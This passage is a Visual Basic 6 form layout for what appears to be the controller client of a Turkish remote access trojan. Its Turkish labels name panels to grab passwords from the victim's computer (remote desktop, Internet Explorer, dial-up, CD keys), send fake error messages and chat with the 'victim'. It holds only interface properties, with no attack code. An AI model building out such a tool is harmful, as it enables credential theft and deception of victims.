         MPTR            =   99
         MICON           =   "Form1.frx":5AC72
         PICN            =   "Form1.frx":5AF8C
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin Client.cmd btn 
         Height          =   495
         Index           =   16
         Left            =   6120
         TabIndex        =   55
         ToolTipText     =   "Uzak masaüstü þifreleri"
         Top             =   2760
         Width           =   495
         _ExtentX        =   873
         _ExtentY        =   873
         BTYPE           =   3
         TX              =   ""
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   99
         MICON           =   "Form1.frx":5B2DE
         PICN            =   "Form1.frx":5B5F8
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin Client.cmd btn 
         Height          =   495
         Index           =   17
         Left            =   6120
         TabIndex        =   56
         ToolTipText     =   "Cd Keyler"
         Top             =   3360
         Width           =   495
         _ExtentX        =   873
         _ExtentY        =   873
         BTYPE           =   3
         TX              =   ""
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   99
         MICON           =   "Form1.frx":5BA82
         PICN            =   "Form1.frx":5BD9C
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin Client.cmd btn 
         Height          =   495
         Index           =   52
         Left            =   6120
         TabIndex        =   110
         ToolTipText     =   "Internet Explorer Þifreleri"
         Top             =   3960
         Width           =   495
         _ExtentX        =   873
         _ExtentY        =   873
         BTYPE           =   3
         TX              =   ""
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   99
         MICON           =   "Form1.frx":5C0EE
         PICN            =   "Form1.frx":5C408
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin Client.cmd btn 
         Height          =   495
         Index           =   53
         Left            =   6120
         TabIndex        =   111
         ToolTipText     =   "Dial-Up Þifreleri"
         Top             =   4560
         Width           =   495
         _ExtentX        =   873
         _ExtentY        =   873
         BTYPE           =   3
         TX              =   ""
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   99
         MICON           =   "Form1.frx":5C75A
         PICN            =   "Form1.frx":5CA74
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin VB.Label lbl 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         Caption         =   "Bilgisayardaki Þifreleri Al"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9.75
            Charset         =   162
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   22
         Left            =   0
         TabIndex        =   50
         Top             =   0
         Width           =   6735
      End
   End
   Begin VB.PictureBox ortacerceve 
      Appearance      =   0  'Flat
      BackColor       =   &H80000005&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   5175
      Index           =   2
      Left            =   12600
      ScaleHeight     =   5145
      ScaleWidth      =   6705
      TabIndex        =   22
      Top             =   360
      Width           =   6735
      Begin VB.ListBox hazirhatamesajlari 
         Appearance      =   0  'Flat
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   1005
         ItemData        =   "Form1.frx":5CF3A
         Left            =   240
         List            =   "Form1.frx":5CF68
         MousePointer    =   99  'Custom
         TabIndex        =   43
         Top             =   3960
         Width           =   5655
      End
      Begin VB.OptionButton tuþlar 
         Appearance      =   0  'Flat
         BackColor       =   &H00FFFFFF&
         Caption         =   "Abort , Retry , Ignore"
         ForeColor       =   &H00000000&
         Height          =   255
         Index           =   6
         Left            =   3960
         MousePointer    =   99  'Custom
         TabIndex        =   33
         ToolTipText     =   "2"
         Top             =   2160
         Width           =   1935
      End
      Begin VB.OptionButton tuþlar 
         Appearance      =   0  'Flat
         BackColor       =   &H00FFFFFF&
         Caption         =   "Retry , Cancel"
         ForeColor       =   &H00000000&
         Height          =   255
         Index           =   5
         Left            =   240
         MousePointer    =   99  'Custom
         TabIndex        =   32
         ToolTipText     =   "5"
         Top             =   2160
         Width           =   1935
      End
      Begin VB.OptionButton tuþlar 
         Appearance      =   0  'Flat
         BackColor       =   &H00FFFFFF&
         Caption         =   "Yes , No , Cancel"
         ForeColor       =   &H00000000&
         Height          =   255
         Index           =   4
         Left            =   2160
         MousePointer    =   99  'Custom
         TabIndex        =   31
         ToolTipText     =   "3"
         Top             =   2160
         Width           =   1815
      End
      Begin VB.OptionButton tuþlar 
         Appearance      =   0  'Flat
         BackColor       =   &H00FFFFFF&
         Caption         =   "Yes , No"
         ForeColor       =   &H00000000&
         Height          =   255
         Index           =   3
         Left            =   2160
         MousePointer    =   99  'Custom
         TabIndex        =   30
         ToolTipText     =   "4"
         Top             =   1920
         Width           =   1815
      End
      Begin VB.OptionButton tuþlar 
         Appearance      =   0  'Flat
         BackColor       =   &H00FFFFFF&
         Caption         =   "OK,Cancel"
         ForeColor       =   &H00000000&
         Height          =   255
         Index           =   2
         Left            =   3960
         MousePointer    =   99  'Custom
         TabIndex        =   29
         ToolTipText     =   "1"
         Top             =   1920
         Width           =   1935
      End
      Begin VB.OptionButton tuþlar 
         Appearance      =   0  'Flat
         BackColor       =   &H00FFFFFF&
         Caption         =   "OK"
         ForeColor       =   &H00000000&
         Height          =   255
         Index           =   1
         Left            =   240
         MousePointer    =   99  'Custom
         TabIndex        =   28
         ToolTipText     =   "0"
         Top             =   1920
         Value           =   -1  'True
         Width           =   1935
      End
      Begin VB.TextBox txthatamesaji 
         Appearance      =   0  'Flat
         ForeColor       =   &H00000000&
         Height          =   285
         Index           =   0
         Left            =   1440
         TabIndex        =   25
         Top             =   600
         Width           =   4455
      End
      Begin VB.TextBox txthatamesaji 
         Appearance      =   0  'Flat
         ForeColor       =   &H00000000&
         Height          =   285
         Index           =   1
         Left            =   1440
         TabIndex        =   24
         Top             =   960
         Width           =   4455
      End
      Begin Client.cmd sahtemsjsimge 
         Height          =   615
         Index           =   0
         Left            =   240
         TabIndex        =   35
         ToolTipText     =   "0"
         Top             =   2880
         Width           =   615
         _ExtentX        =   1085
         _ExtentY        =   1085
         BTYPE           =   8
         TX              =   "ANY"
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   99
         MICON           =   "Form1.frx":5D0C7
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin Client.cmd sahtemsjsimge 
         Height          =   615
         Index           =   1
         Left            =   1560
         TabIndex        =   36
         ToolTipText     =   "16"
         Top             =   2880
         Width           =   615
         _ExtentX        =   1085
         _ExtentY        =   1085
         BTYPE           =   8
         TX              =   ""
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   99
         MICON           =   "Form1.frx":5D3E1
         PICN            =   "Form1.frx":5D6FB
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin Client.cmd sahtemsjsimge 
         Height          =   615
         Index           =   2
         Left            =   2760
         TabIndex        =   37
         ToolTipText     =   "48"
         Top             =   2880
         Width           =   615
         _ExtentX        =   1085
         _ExtentY        =   1085
         BTYPE           =   8
         TX              =   ""
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   99
         MICON           =   "Form1.frx":5E2ED
         PICN            =   "Form1.frx":5E607
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin Client.cmd sahtemsjsimge 
         Height          =   615
         Index           =   3
         Left            =   3960
         TabIndex        =   38
         ToolTipText     =   "64"
         Top             =   2880
         Width           =   615
         _ExtentX        =   1085
         _ExtentY        =   1085
         BTYPE           =   8
         TX              =   ""
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   99
         MICON           =   "Form1.frx":5F17D
         PICN            =   "Form1.frx":5F497
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin Client.cmd sahtemsjsimge 
         Height          =   615
         Index           =   4
         Left            =   5280
         TabIndex        =   39
         ToolTipText     =   "32"
         Top             =   2880
         Width           =   615
         _ExtentX        =   1085
         _ExtentY        =   1085
         BTYPE           =   8
         TX              =   ""
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   99
         MICON           =   "Form1.frx":600E9
         PICN            =   "Form1.frx":60403
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin Client.cmd btn 
         Height          =   495
         Index           =   9
         Left            =   6120
         TabIndex        =   40
         ToolTipText     =   "mesajý test et"
         Top             =   360
         Width           =   495
         _ExtentX        =   873
         _ExtentY        =   873
         BTYPE           =   3
         TX              =   ""
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   16777215
         MPTR            =   99
         MICON           =   "Form1.frx":61055
         PICN            =   "Form1.frx":6136F
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin Client.cmd btn 
         Height          =   495
         Index           =   10
         Left            =   6120
         TabIndex        =   41
         ToolTipText     =   "mesajý gönder"
         Top             =   960
         Width           =   495
         _ExtentX        =   873
         _ExtentY        =   873
         BTYPE           =   3
         TX              =   ""
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   16777215
         MPTR            =   99
         MICON           =   "Form1.frx":616C1
         PICN            =   "Form1.frx":619DB
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin Client.cmd btn 
         Height          =   495
         Index           =   11
         Left            =   6120
         TabIndex        =   42
         ToolTipText     =   "metin alanlarini temizle"
         Top             =   1560
         Width           =   495
         _ExtentX        =   873
         _ExtentY        =   873
         BTYPE           =   3
         TX              =   ""
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   16777215
         MPTR            =   99
         MICON           =   "Form1.frx":61D2D
         PICN            =   "Form1.frx":62047
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin VB.Label lbl 
         Appearance      =   0  'Flat
         AutoSize        =   -1  'True
         BackColor       =   &H00FFFFFF&
         Caption         =   " Hazýr Hata Mesajlarý "
         ForeColor       =   &H00000000&
         Height          =   195
         Index           =   14
         Left            =   240
         TabIndex        =   47
         Top             =   3720
         Width           =   1515
      End
      Begin VB.Label lbl 
         Appearance      =   0  'Flat
         AutoSize        =   -1  'True
         BackColor       =   &H00FFFFFF&
         Caption         =   " Mesan Simgesi "
         ForeColor       =   &H00000000&
         Height          =   195
         Index           =   8
         Left            =   240
         TabIndex        =   45
         Top             =   2640
         Width           =   1125
      End
      Begin VB.Label lbl 
         Alignment       =   1  'Right Justify
         Appearance      =   0  'Flat
         AutoSize        =   -1  'True
         BackColor       =   &H00000080&
         BackStyle       =   0  'Transparent
         Caption         =   "satir atlamak için '|' karakterini kullanabilirsiniz."
         ForeColor       =   &H00808080&
         Height          =   195
         Index           =   6
         Left            =   2580
         TabIndex        =   44
         Top             =   1320
         Width           =   3285
      End
      Begin VB.Label lbl 
         Appearance      =   0  'Flat
         AutoSize        =   -1  'True
         BackColor       =   &H00FFFFFF&
         Caption         =   " Mesaj Butonlarý "
         ForeColor       =   &H00000000&
         Height          =   195
         Index           =   11
         Left            =   240
         TabIndex        =   34
         Top             =   1680
         Width           =   1185
      End
      Begin VB.Label lbl 
         Appearance      =   0  'Flat
         BackColor       =   &H00000080&
         BackStyle       =   0  'Transparent
         Caption         =   "Mesaj Baþlýðý :"
         ForeColor       =   &H00000000&
         Height          =   210
         Index           =   7
         Left            =   240
         TabIndex        =   27
         Top             =   600
         Width           =   1395
      End
      Begin VB.Label lbl 
         Appearance      =   0  'Flat
         BackColor       =   &H00000080&
         BackStyle       =   0  'Transparent
         Caption         =   "Mesaj : "
         ForeColor       =   &H00000000&
         Height          =   210
         Index           =   9
         Left            =   240
         TabIndex        =   26
         Top             =   960
         Width           =   915
      End
      Begin VB.Label lbl 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         Caption         =   "Sahte Hata Mesajý Gönder"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9.75
            Charset         =   162
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   5
         Left            =   0
         TabIndex        =   23
         Top             =   0
         Width           =   6735
      End
      Begin VB.Label lbl 
         Appearance      =   0  'Flat
         AutoSize        =   -1  'True
         BackColor       =   &H00FFFFFF&
         Caption         =   " Mesaj Ayarlarý "
         ForeColor       =   &H00000000&
         Height          =   195
         Index           =   10
         Left            =   240
         TabIndex        =   46
         Top             =   360
         Width           =   1110
      End
      Begin VB.Shape shp 
         BorderColor     =   &H00000000&
         Height          =   1140
         Index           =   0
         Left            =   120
         Top             =   480
         Width           =   5895
      End
      Begin VB.Shape shp 
         BorderColor     =   &H00000000&
         Height          =   780
         Index           =   4
         Left            =   120
         Top             =   1800
         Width           =   5895
      End
      Begin VB.Shape shp 
         BorderColor     =   &H00000000&
         Height          =   900
         Index           =   7
         Left            =   120
         Top             =   2760
         Width           =   5895
      End
      Begin VB.Shape shp 
         BorderColor     =   &H00000000&
         Height          =   1215
         Index           =   8
         Left            =   120
         Top             =   3840
         Width           =   5895
      End
   End
   Begin Client.cmd btn 
      Height          =   375
      Index           =   0
      Left            =   720
      TabIndex        =   1
      ToolTipText     =   "Active Or Deactive Client"
      Top             =   480
      Width           =   375
      _ExtentX        =   661
      _ExtentY        =   661
      BTYPE           =   3
      TX              =   ""
      ENAB            =   -1  'True
      BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   162
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      COLTYPE         =   2
      FOCUSR          =   -1  'True
      BCOL            =   16777215
      BCOLO           =   16777215
      FCOL            =   0
      FCOLO           =   0
      MCOL            =   12632256
      MPTR            =   99
      MICON           =   "Form1.frx":623F9
      PICN            =   "Form1.frx":62713
      UMCOL           =   -1  'True
      SOFT            =   0   'False
      PICPOS          =   0
      NGREY           =   0   'False
      FX              =   0
      HAND            =   -1  'True
      CHECK           =   0   'False
      VALUE           =   0   'False
   End
   Begin MSComctlLib.TreeView tvw 
      CausesValidation=   0   'False
      Height          =   4335
      Left            =   240
      TabIndex        =   4
      Top             =   960
      Width           =   2295
      _ExtentX        =   4048
      _ExtentY        =   7646
      _Version        =   393217
      Indentation     =   0
      LabelEdit       =   1
      Style           =   3
      Scroll          =   0   'False
      SingleSel       =   -1  'True
      ImageList       =   "imlist"
      BorderStyle     =   1
      Appearance      =   0
      MousePointer    =   99
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      MouseIcon       =   "Form1.frx":62C15
   End
   Begin Client.cmd btn 
      Height          =   375
      Index           =   4
      Left            =   240
      TabIndex        =   5
      ToolTipText     =   "Server Editor"
      Top             =   480
      Width           =   375
      _ExtentX        =   661
      _ExtentY        =   661
      BTYPE           =   3
      TX              =   ""
      ENAB            =   -1  'True
      BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   162
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      COLTYPE         =   2
      FOCUSR          =   -1  'True
      BCOL            =   16777215
      BCOLO           =   16777215
      FCOL            =   0
      FCOLO           =   0
      MCOL            =   12632256
      MPTR            =   99
      MICON           =   "Form1.frx":62D77
      PICN            =   "Form1.frx":63091
      UMCOL           =   -1  'True
      SOFT            =   0   'False
      PICPOS          =   0
      NGREY           =   0   'False
      FX              =   0
      HAND            =   -1  'True
      CHECK           =   0   'False
      VALUE           =   0   'False
   End
   Begin VB.PictureBox ortacerceve 
      Appearance      =   0  'Flat
      BackColor       =   &H80000005&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   5175
      Index           =   1
      Left            =   12600
      ScaleHeight     =   5145
      ScaleWidth      =   6705
      TabIndex        =   12
      Top             =   0
      Width           =   6735
      Begin VB.TextBox txtchat 
         Appearance      =   0  'Flat
         Height          =   285
         Index           =   2
         Left            =   120
         TabIndex        =   20
         Text            =   "Hacker"
         Top             =   4680
         Width           =   855
      End
      Begin VB.TextBox txtchat 
         Appearance      =   0  'Flat
         BackColor       =   &H00FFFFFF&
         ForeColor       =   &H00404040&
         Height          =   285
         Index           =   1
         Left            =   1080
         TabIndex        =   17
         Top             =   4680
         Width           =   4935
      End
      Begin VB.TextBox txtchat 
         Appearance      =   0  'Flat
         BackColor       =   &H00FFFFFF&
         ForeColor       =   &H00404040&
         Height          =   4215
         Index           =   0
         Left            =   120
         MultiLine       =   -1  'True
         TabIndex        =   16
         Top             =   360
         Width           =   5895
      End
      Begin Client.cmd btn 
         Height          =   495
         Index           =   5
         Left            =   6120
         TabIndex        =   14
         ToolTipText     =   "chat yapmaya basla"
         Top             =   360
         Width           =   495
         _ExtentX        =   873
         _ExtentY        =   873
         BTYPE           =   3
         TX              =   ""
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   16777215
         MPTR            =   99
         MICON           =   "Form1.frx":63593
         PICN            =   "Form1.frx":638AD
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin Client.cmd btn 
         Height          =   495
         Index           =   6
         Left            =   6120
         TabIndex        =   15
         ToolTipText     =   "chat yapmayý durdur"
         Top             =   960
         Width           =   495
         _ExtentX        =   873
         _ExtentY        =   873
         BTYPE           =   3
         TX              =   ""
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   16777215
         MPTR            =   99
         MICON           =   "Form1.frx":63C73
         PICN            =   "Form1.frx":63F8D
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin Client.cmd btn 
         Height          =   495
         Index           =   7
         Left            =   6120
         TabIndex        =   18
         ToolTipText     =   "chat ekranýný temizle"
         Top             =   1560
         Width           =   495
         _ExtentX        =   873
         _ExtentY        =   873
         BTYPE           =   3
         TX              =   ""
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   99
         MICON           =   "Form1.frx":64353
         PICN            =   "Form1.frx":6466D
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin Client.cmd btn 
         Height          =   495
         Index           =   8
         Left            =   6120
         TabIndex        =   19
         ToolTipText     =   "chat iletisini gönder"
         Top             =   4560
         Width           =   495
         _ExtentX        =   873
         _ExtentY        =   873
         BTYPE           =   3
         TX              =   ""
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   16777215
         MPTR            =   99
         MICON           =   "Form1.frx":64A1F
         PICN            =   "Form1.frx":64D39
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin VB.Label lbl 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         Caption         =   "Kurbanla Chat Yap"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9.75
            Charset         =   162
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   13
         Left            =   0
         TabIndex        =   13
         Top             =   0
         Width           =   6735
      End
   End
   Begin MSComctlLib.ListView lvw 
      Height          =   1335
      Index           =   7
      Left            =   240
      TabIndex        =   112
      Top             =   5400
      Width           =   2295
      _ExtentX        =   4048
      _ExtentY        =   2355
      View            =   3
      LabelWrap       =   -1  'True
      HideSelection   =   -1  'True
      GridLines       =   -1  'True
      _Version        =   393217
      Icons           =   "sysinfolist"
      SmallIcons      =   "sysinfolist"
      ForeColor       =   -2147483640
      BackColor       =   -2147483643
      BorderStyle     =   1
      Appearance      =   0
      MousePointer    =   99
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      NumItems        =   2
      BeginProperty ColumnHeader(1) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         Text            =   "SIN"
         Object.Width           =   2293
      EndProperty
      BeginProperty ColumnHeader(2) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         SubItemIndex    =   1
         Text            =   "Port"
         Object.Width           =   1252
      EndProperty
   End
   Begin VB.PictureBox ortacerceve 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      BeginProperty Font 
